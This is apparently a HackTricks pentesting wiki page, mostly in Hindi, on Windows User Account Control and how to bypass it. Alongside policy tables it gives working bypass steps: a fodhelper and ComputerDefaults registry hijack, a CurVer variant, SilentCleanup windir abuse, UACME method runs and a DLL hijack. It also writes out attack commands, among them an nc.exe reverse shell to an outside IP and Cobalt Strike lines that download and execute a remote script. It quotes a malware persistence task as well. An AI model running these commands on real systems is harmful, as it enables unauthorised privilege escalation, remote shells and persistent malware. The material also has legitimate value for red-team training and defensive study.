# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) एक ऐसा फीचर है जो **उच्च विशेषाधिकार वाली गतिविधियों के लिए सहमति का prompt** दिखाता है। Applications के `integrity` स्तर अलग-अलग होते हैं, और **high level** वाला program ऐसे कार्य कर सकता है जो **संभवतः system को खतरे में डाल सकते हैं**। UAC चालू होने पर applications और tasks हमेशा **non-administrator account के security context में चलते हैं**, जब तक कि कोई administrator इन applications/tasks को system पर चलने के लिए administrator-level access की स्पष्ट अनुमति न दे। यह एक सुविधा है जो administrators को अनचाहे बदलावों से बचाती है, लेकिन इसे security boundary नहीं माना जाता।<sup>[[2]](#references)</sup>

Integrity levels के बारे में अधिक जानकारी:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC चालू होने पर administrator user को 2 tokens दिए जाते हैं: सामान्य कार्यों को medium integrity पर करने के लिए एक standard user token, और admin privileges वाला दूसरा token।

यह [पृष्ठ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) UAC के काम करने के तरीके पर विस्तार से चर्चा करता है और इसमें logon process, user experience और UAC architecture शामिल हैं।<sup>[[2]](#references)</sup> Administrators, अपने संगठन के अनुसार UAC को स्थानीय स्तर पर (secpol.msc का उपयोग करके) configure करने के लिए security policies का उपयोग कर सकते हैं, या Active Directory domain environment में Group Policy Objects (GPO) के ज़रिए configure करके लागू कर सकते हैं। विभिन्न settings पर [यहाँ](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings) विस्तार से चर्चा की गई है। UAC के लिए 10 Group Policy settings configure की जा सकती हैं। निम्न तालिका अतिरिक्त जानकारी देती है:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: built-in Administrator account के लिए Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Admin Approval Mode में administrators के लिए elevation prompt का व्यवहार](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: standard users के लिए elevation prompt का व्यवहार](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: application installations का पता लगाना और elevation prompt दिखाना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: केवल signed और validated executables को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: केवल secure locations में install किए गए UIAccess applications को elevate करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: सभी administrators को Admin Approval Mode में चलाना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: UIAccess applications को secure desktop का उपयोग किए बिना elevation prompt दिखाने देना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: elevation prompt दिखाते समय secure desktop पर स्विच करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: file और registry write failures को प्रति-user locations पर virtualize करना](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Windows पर software install करने की policies

**Local security policies** (अधिकांश systems पर "secpol.msc") default रूप से **non-admin users को software install करने से रोकने** के लिए configured होती हैं। इसका अर्थ है कि भले ही कोई non-admin user आपके software का installer download कर सके, वह admin account के बिना उसे चला नहीं पाएगा।

### UAC से Elevation माँगने के लिए Registry Keys

Admin rights के बिना एक standard user के रूप में, आप यह सुनिश्चित कर सकते हैं कि "standard" account कुछ कार्य करने की कोशिश करते समय **UAC द्वारा credentials देने के लिए prompt किया जाए**। इसके लिए कुछ **registry keys** में बदलाव करना होगा, जिसके लिए admin permissions चाहिए—जब तक कि कोई **UAC bypass** न हो, या attacker पहले से admin के रूप में logged in न हो।

भले ही user **Administrators** group में हो, ये बदलाव administrative actions करने के लिए user से **अपने account credentials फिर से दर्ज करवाते हैं**।

**व्यवहार में, यह तभी उपयोगी है जब आपके पास पहले से elevated token, UAC bypass या ऐसी misconfiguration हो जो आपको इन keys में बदलाव करने देती हो; अन्यथा registry write स्वयं ही block हो जाता है।**

जिन registry keys और entries को बदलना होगा, वे नीचे दी गई हैं (कोष्ठक में उनकी default values हैं):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
  - `ConsentPromptBehaviorUser` = 1 (3)
  - `ConsentPromptBehaviorAdmin` = 1 (5)
  - `PromptOnSecureDesktop` = 1 (1)

यह काम Local Security Policy tool के ज़रिए manually भी किया जा सकता है। बदलाव करने के बाद, administrative operations के लिए user को अपने credentials फिर से दर्ज करने होंगे।

### ध्यान दें

**User Account Control कोई security boundary नहीं है।** इसलिए, standard users local privilege escalation exploit के बिना अपने accounts से बाहर निकलकर administrator rights प्राप्त नहीं कर सकते।

### किसी user से 'full computer access' माँगना

```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```

### UAC विशेषाधिकार

- Internet Explorer Protected Mode, high-integrity-level processes (जैसे web browsers) को low-integrity-level data (जैसे temporary Internet files folder) तक पहुँचने से रोकने के लिए integrity checks का उपयोग करता है। यह browser को low-integrity token के साथ चलाकर किया जाता है। जब browser low-integrity zone में stored data तक पहुँचने की कोशिश करता है, तो operating system process का integrity level जाँचता है और उसी के अनुसार पहुँच की अनुमति देता है। यह सुविधा Remote Code Execution attacks को system पर sensitive data तक पहुँचने से रोकने में मदद करती है।
- जब कोई user Windows में log on करता है, तो system एक access token बनाता है जिसमें user के privileges की सूची होती है। Privileges को user के rights और capabilities के संयोजन के रूप में परिभाषित किया जाता है। Token में user के credentials की सूची भी होती है, जिनका उपयोग computer और network पर resources के लिए user को authenticate करने हेतु किया जाता है।

### Autoadminlogon

Windows को startup पर किसी खास user को अपने आप log on कराने के लिए, **`AutoAdminLogon` registry key** सेट करें। यह kiosk environments या testing के लिए उपयोगी है। इसका उपयोग केवल secure systems पर करें, क्योंकि इससे password registry में उजागर हो जाता है।

Registry Editor या `reg add` का उपयोग करके ये keys सेट करें:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
  - `AutoAdminLogon` = 1
  - `DefaultUsername` = username
  - `DefaultPassword` = password

सामान्य logon behavior पर लौटने के लिए, `AutoAdminLogon` को 0 पर सेट करें।

## UAC bypass

> [!TIP]
> ध्यान दें कि अगर आपके पास victim का graphical access है, तो UAC bypass सीधा है, क्योंकि UAC prompt दिखाई देने पर आप बस "Yes" पर click कर सकते हैं।

UAC bypass की ज़रूरत इस स्थिति में होती है: **UAC सक्रिय है, आपका process medium integrity context में चल रहा है, और आपका user administrators group का सदस्य है।**

यह बताना ज़रूरी है कि **अगर UAC highest security level (Always) पर है, तो इसे bypass करना अन्य levels (Default) की तुलना में बहुत कठिन है।**

### Medium-integrity shell से Fast triage

Bypass आज़माने से पहले, पुष्टि करें कि आप सही स्थिति में हैं और host build के अनुसार ज्ञात काम करने वाले methods की पहचान करें:

```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```

व्यावहारिक नोट्स:
- अगर `EnableLUA=0` है, तो आपको bypass की ज़रूरत नहीं है: कोई भी admin token सीधे high integrity का अनुरोध कर सकता है।
- `ConsentPromptBehaviorAdmin=2` या `5` auto-elevate / COM-based bypasses के लिए आम स्थिति है।
- `Always Notify` सुरक्षा का स्तर बढ़ाता है, लेकिन फिर भी विफलता मान लेने के बजाय सटीक build को जाँचें: UACME अब भी आधुनिक Windows builds पर `AlwaysNotify compatible` कुछ methods को ट्रैक करता है।<sup>[[3]](#references)</sup>

### UAC अक्षम

अगर UAC पहले से अक्षम है (`ConsentPromptBehaviorAdmin` **`0`** है), तो आप कुछ इस तरह **admin privileges के साथ reverse shell execute कर सकते हैं**:

```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```

#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### Local RPC + reusable debug object

AppInfo local RPC interface `201ef99a-7fa0-444c-9399-19ba84f12a1a` debugging enabled के साथ एक process बना सकता है। एक ही thread पर debug-created processes उस thread का debug object साझा करते हैं; creation debug event में full-access process handle होता है, भले ही RPC result खुद केवल limited access देता हो। इससे debug-object reuse, Administrators group के medium-integrity सदस्य के लिए UAC primitive बन जाता है।<sup>[[11]](#references)[[12]](#references)</sup>

एक व्यावहारिक chain यह है:<sup>[[11]](#references)[[12]](#references)</sup>

1. Debugging enabled के साथ एक non-elevated sacrificial process बनाने के लिए local RPC method को call करें (सीधे या `NdrAsyncClientCall` के ज़रिए)।
2. `NtQueryInformationProcess` से `ProcessDebugObjectHandle` query करें, `NtRemoveProcessDebug` से detach करें, object को अपने पास रखें और sacrificial process को terminate करें।
3. Trusted auto-elevated process बनाने के लिए उसी RPC interface का उपयोग करें, फिर `DbgUiSetThreadDebugObject` के ज़रिए saved object को calling thread से associate करें।
4. `WaitForDebugEvent` call करें और `CREATE_PROCESS_DEBUG_EVENT` का process handle लें; आगे बढ़ने से पहले उसे `NtDuplicateObject` से duplicate करें।
5. Duplicated handle को `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, ...)` में दें और extended startup-info structure के साथ payload launch करें। इससे elevated process context का reuse होता है और child को एक trusted-looking parent relationship भी मिलता है।

सिर्फ auto-elevated binary पर नहीं, बल्कि इस छोटे sequence पर ध्यान दें: local AppInfo RPC process creation, `ProcessDebugObjectHandle` queries, debugger detach/reattach, तुरंत आने वाला creation-debug event, handle duplication, और ऐसा child जिसका recorded parent उस process से मेल नहीं खाता जिसने creation APIs को call किया था।<sup>[[12]](#references)</sup>

### **बहुत** Basic UAC "bypass" (पूरा file system access)

अगर आपके पास Administrators group के किसी user का shell है, तो आप SMB के ज़रिए साझा किए गए **C$ को mount** करके उसे नई disk पर local रूप से जोड़ सकते हैं और आपको **file system के अंदर मौजूद हर चीज़ का access** मिल जाएगा (Administrator के home folder तक भी)।

> [!WARNING]
> **लगता है कि यह तरकीब अब काम नहीं कर रही है**

```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```

### Cobalt Strike के साथ UAC bypass

Cobalt Strike की techniques तभी काम करेंगी, जब UAC को उसके अधिकतम security level पर set न किया गया हो.

```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```

**Empire** और **Metasploit** में **UAC** को **bypass** करने के लिए कई modules भी हैं।

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects, modern builds पर UAC का एक व्यावहारिक attack surface बने हुए हैं। UACME में `ICMLuaUtil` को अभी भी Windows के मौजूदा branches पर काम करने वाला दर्ज किया गया है, और offensive tooling, COM Elevation Moniker invoke करने से पहले interactive desktop process, 64-bit execution और कभी-कभी PEB/process masquerading को मिलाकर `CMSTPLUA` के तरीकों को अपनाती रहती है।<sup>[[3]](#references)</sup>

व्यावहारिक सुझाव:
- उपयोगकर्ता के **interactive session** में **64-bit** process को प्राथमिकता दें (आमतौर पर `explorer.exe` या उसका child process)।
- अगर raw shell काम न करे, तो naive `CreateProcess` wrapper के बजाय BOF / UACME implementation से दोबारा प्रयास करें।
- ध्यान रखें कि child execution एक **अलग elevated process** में हो सकता है; कई BOF, मौजूदा beacon को उसी process में elevate नहीं करते।

### KRBUACBypass

दस्तावेज़ और tool यहाँ उपलब्ध हैं: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) UAC bypass techniques का एक collection है। इसे Visual Studio या MSBuild से compile करें; build कई executables बनाता है (उदाहरण के लिए, `Source\Akagi\output\x64\Debug\Akagi.exe`), इसलिए target build के लिए उपयुक्त method चुनें।<sup>[[3]](#references)</sup>\
सावधान रहें: कुछ bypass ऐसे programs या prompts खोलते हैं जो उपयोगकर्ता का ध्यान खींच सकते हैं।<sup>[[3]](#references)</sup>

UACME में वह **build version दिया गया है जहाँ से प्रत्येक technique काम करना शुरू हुई**।<sup>[[3]](#references)</sup> आप अपने versions को प्रभावित करने वाली technique खोज सकते हैं:

```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```

साथ ही, [इस](https://en.wikipedia.org/wiki/Windows_10_version_history) पेज का इस्तेमाल करके आप build versions से Windows release `1607` पता कर सकते हैं।

एक व्यावहारिक workflow यह है कि पहले **host build का आकलन करें**, और उसके बाद ही उससे मेल खाने वाली विधि आज़माएँ:

```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```

- `WinPwnage` स्थानीय build की उसके ज्ञात UAC methods से तेज़ी से तुलना करता है, जिससे पुराने पड़ चुके PoCs को जल्दी हटाया जा सकता है।<sup>[[4]](#references)</sup>
- किसी bypass को सटीक build से मिलाने के लिए `UACME` अब भी सबसे अच्छा सार्वजनिक catalogue है। Version 3.7.1 में methods 83–85 जोड़े गए, जबकि उससे पहले वाली release में मौजूदा methods को **Windows 11 25H2** पर फिर से जाँचा गया; यह मानने के बजाय कि कोई पुराना PoC अब भी बिना बदलाव के लागू होता है, method table और release notes दोबारा जाँचें।<sup>[[3]](#references)[[9]](#references)</sup>

### Always Notify-सक्षम WNF/UIAccess chains (UACME 3.7.1)

`Always Notify` हर UAC bypass को नहीं रोकता। UACME 3.7.1 में तीन नए x64 methods हैं, जो user-controlled environment/protocol state को elevated scheduled-task या UIAccess behavior के साथ जोड़ते हैं और इन सभी को `AlwaysNotify compatible` के रूप में चिह्नित करते हैं:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** `SystemRoot` को redirect करें, ताकि WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask`, elevated `taskhostw.exe` से `unifiedconsent.dll` side-load करवाए। UACME इसे Windows 10 build 19041 से ट्रैक करता है।
- **84 — TabTip:** UIAccess `TabTip.exe` के विरुद्ध वही environment-variable primitive इस्तेमाल करें। यह build के आधार पर `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, या `rsaenh.dll` लोड करता है; फिर resulting high-integrity UIAccess context से आगे बढ़ें। UACME इसे Windows 8.1 / Server 2016 से ट्रैक करता है।
- **85 — Narrator:** per-user `feedback-hub` protocol hijack करें, `Alt+CapsLock+F` से Narrator चलाएँ, फिर `osk.exe` की writable copy लॉन्च करें, जो `OskSupport.dll` को side-load करती है। इसके लिए interactive desktop ज़रूरी है; इसे Windows 10 1809 / Server 2019 से ट्रैक किया गया है।

UACME में बताए अनुसार payload units और Akagi build करने के बाद, संबंधित method number चलाएँ (optional command का default `cmd.exe` है):

```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```

Methods 84 और 85 UIAccess/desktop interaction पर निर्भर करते हैं, इसलिए Session 0 या non-interactive service shell से इनके बिना बदलाव के काम करने की अपेक्षा न करें। ये तीनों environment/protocol state में बदलाव करते हैं और DLLs को stage करते हैं; implementation का निरीक्षण करें और testing के बाद उन artifacts को हटा दें।<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

trusted binary `fodhelper.exe` आधुनिक Windows पर auto-elevated होता है। लॉन्च होने पर, यह नीचे दिए गए per-user registry path को `DelegateExecute` verb को validate किए बिना query करता है। वहाँ कोई command रखने से Medium Integrity process (जिसका user Administrators में है) को UAC prompt के बिना High Integrity process spawn करने की अनुमति मिलती है।

fodhelper द्वारा query किया गया Registry path:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```

<details>
<summary>PowerShell चरण (अपना payload सेट करें, फिर trigger करें)</summary>

```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```

</details>
Notes:
- तब काम करता है जब मौजूदा user, Administrators का सदस्य हो और UAC level default/lenient हो (अतिरिक्त प्रतिबंधों वाले Always Notify पर नहीं)।
- 64-bit Windows पर 32-bit process से 64-bit PowerShell शुरू करने के लिए `sysnative` path का उपयोग करें।
- Payload कोई भी command हो सकता है (PowerShell, cmd या EXE path)। Stealth के लिए prompting UIs से बचें।

#### उसी `ms-settings` handler के लिए `ComputerDefaults.exe` trigger

`ComputerDefaults.exe`, `fodhelper.exe` की तरह ही per-user `ms-settings\Shell\Open\command` association को resolve करता है।<sup>[[13]](#references)[[14]](#references)</sup> ऊपर default command और खाली `DelegateExecute` value सेट करने के बाद, वैकल्पिक trigger के रूप में `Start-Process "$env:WINDIR\System32\ComputerDefaults.exe"` का उपयोग करें; registry setup दोबारा न करें।<sup>[[13]](#references)[[14]](#references)</sup> ऊपर दिए गए `fodhelper.exe` notes में बताई गई medium-integrity administrator और UAC policy की आवश्यकताएँ यहाँ भी लागू होती हैं।<sup>[[2]](#references)[[3]](#references)</sup> UACME में इस trigger को Windows 10 RS4 (build 17134) से सूचीबद्ध किया गया है, इसलिए target build पर इसकी पुष्टि करें।<sup>[[3]](#references)</sup>

#### CurVer/extension hijack variant (केवल HKCU)

`fodhelper.exe` का दुरुपयोग करने वाले हाल के samples `DelegateExecute` से बचते हैं और इसके बजाय per-user `CurVer` value के ज़रिए **`ms-settings` ProgID को redirect करते हैं**। Auto-elevated binary अब भी handler को `HKCU` के तहत resolve करता है, इसलिए keys लगाने के लिए admin token की आवश्यकता नहीं होती:<sup>[[5]](#references)</sup>

```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```

Elevated होने के बाद, malware आमतौर पर `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` को `0` पर सेट करके **आगे आने वाले prompts को disable** कर देता है, फिर अतिरिक्त defense evasion करता है (जैसे, `Add-MpPreference -ExclusionPath C:\ProgramData`) और high integrity के रूप में चलने के लिए persistence को फिर से बनाता है। एक सामान्य persistence task, **XOR-encrypted PowerShell script** को disk पर store करता है और हर घंटे उसे decode करके memory में execute करता है:<sup>[[5]](#references)</sup>

```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```

यह variant अभी भी dropper को साफ़ कर देता है और केवल staged payloads छोड़ता है, जिससे detection `CurVer` hijack, `ConsentPromptBehaviorAdmin` tampering, Defender exclusion बनाने या ऐसे scheduled tasks की निगरानी पर निर्भर होती है जो PowerShell को memory में decrypt करते हैं।<sup>[[5]](#references)</sup>

### `SilentCleanup` task (`HKCU\Environment\windir`) के ज़रिए UAC bypass

`SilentCleanup`, `cleanmgr.exe` को highest privileges के साथ लॉन्च करता है और user environment से `%windir%` का विस्तार करता है। यदि आप `HKCU\Environment\windir` को नियंत्रित करते हैं, तो उस विस्तार को किसी भी command की ओर redirect करके consent dialog के बिना high integrity प्राप्त कर सकते हैं।<sup>[[8]](#references)</sup> हाल के builds पर भी इस method को test करना उपयोगी है, क्योंकि UACME इस technique को सक्रिय रखता है और हाल की issue tracking से पता चलता है कि Windows 11 24H2 में शायद केवल quoting के छोटे समायोजन की ज़रूरत हो।<sup>[[3]](#references)</sup>

```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```

यदि उस build पर task path को quotes में रखता है, तो payload के अंत में quote लगाकर दोबारा प्रयास करें (उदाहरण के लिए `cmd.exe"`)। परीक्षण के बाद `HKCU\Environment\windir` को हमेशा साफ़ करें।

#### More UAC bypass

कई पुराने UAC bypass, जो UI flows, COM objects या desktop interaction का दुरुपयोग करते हैं, victim के साथ **full interactive session** की मांग करते हैं; आमतौर पर `nc.exe` shell या **Session 0** में चल रही service पर्याप्त नहीं होती।

अक्सर आप इसे **meterpreter** session का उपयोग करके हल कर सकते हैं। ऐसे **process** में migrate करें जिसका **Session** मान **1** हो:

![ms-settings को custom extension (.thm) पर point करें और उस extension को हमारे payload से map करें - More UAC bypass: आप meterpreter session का उपयोग करके ऐसा कर सकते हैं। ऐसे process में migrate करें जिसका Session...](<../../images/image (863).png>)

(_explorer.exe_ को काम करना चाहिए)

### GUI से UAC Bypass

यदि आपके पास **GUI का access है, तो UAC prompt दिखाई देने पर आप उसे स्वीकार कर सकते हैं**; आपको वास्तव में technical bypass की ज़रूरत नहीं है। इसलिए, UAC से पैदा होने वाली व्यावहारिक रुकावट को पार करने के लिए अक्सर GUI session प्राप्त करना ही पर्याप्त होता है।

इसके अलावा, यदि आपको ऐसा GUI session मिलता है जिसका कोई उपयोग कर रहा था (संभवतः RDP के ज़रिए), तो उसमें **कुछ tools administrator के रूप में चल रहे होंगे**। इनके ज़रिए आप, उदाहरण के लिए, **cmd** को सीधे **admin के रूप में चला** सकते हैं और UAC दोबारा prompt नहीं करेगा; जैसे [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)। यह थोड़ा अधिक **stealthy** हो सकता है।

### Noisy brute-force UAC bypass

यदि noise स्वीकार्य है, तो [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) जैसा tool बार-बार elevation का अनुरोध कर सकता है, जब तक user उसे स्वीकार न कर ले।

### अपना bypass - Basic UAC bypass methodology

यदि आप **UACME** पर नज़र डालें, तो पाएँगे कि **कई UAC bypass DLL hijacking का दुरुपयोग करते हैं** (अक्सर elevated binary से writable path में मौजूद attacker-controlled DLL load करवाकर)। [DLL hijacking vulnerability ढूँढ़ने का तरीका जानने के लिए इसे पढ़ें](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. ऐसा binary ढूँढ़ें जो **autoelevate** हो (जाँचें कि चलाए जाने पर वह high integrity level में चलता है)।
2. ProcMon से "**NAME NOT FOUND**" events ढूँढ़ें, जो **DLL Hijacking** के प्रति vulnerable हो सकते हैं।
3. संभवतः आपको DLL को कुछ **protected paths** (जैसे C:\Windows\System32) में **लिखना** होगा, जहाँ आपको write permissions नहीं हैं। आप इसे इस तरह bypass कर सकते हैं:
   1. **wusa.exe**: Windows 7,8 और 8.1। यह protected paths में CAB file का content extract कर सकता है (क्योंकि यह tool high integrity level से execute होता है)।
   2. **IFileOperation**: Windows 10।
4. अपनी DLL को protected path में copy करने और vulnerable तथा autoelevated binary को execute करने के लिए एक **script** तैयार करें।

### एक अन्य UAC bypass technique

इसमें यह देखना शामिल है कि क्या कोई **autoElevated binary** **registry** से किसी **binary** या **command** का **name/path** पढ़ने की कोशिश करता है, जिसे **execute** किया जाना है (यह तब अधिक उपयोगी है जब binary यह जानकारी **HKCU** के अंदर खोजता है)।

### `SysWOW64\iscsicpl.exe` और user `PATH` DLL hijack के ज़रिए UAC bypass

32-bit `C:\Windows\SysWOW64\iscsicpl.exe` एक **auto-elevated** binary है, जिसका search order के ज़रिए `iscsiexe.dll` load करने के लिए दुरुपयोग किया जा सकता है। यदि आप किसी malicious `iscsiexe.dll` को **user-writable** folder में रख सकें और फिर current user का `PATH` (उदाहरण के लिए `HKCU\Environment\Path` के ज़रिए) बदलें ताकि वह folder search हो, तो Windows attacker DLL को elevated `iscsicpl.exe` process में **UAC prompt दिखाए बिना** load कर सकता है।<sup>[[1]](#references)[[6]](#references)</sup>

व्यावहारिक नोट्स:
- यह तब उपयोगी है जब current user **Administrators** में हो, लेकिन UAC के कारण **Medium Integrity** पर चल रहा हो।
- इस bypass के लिए **SysWOW64** वाली copy प्रासंगिक है। **System32** वाली copy को अलग binary मानें और उसके behavior को अलग से validate करें।
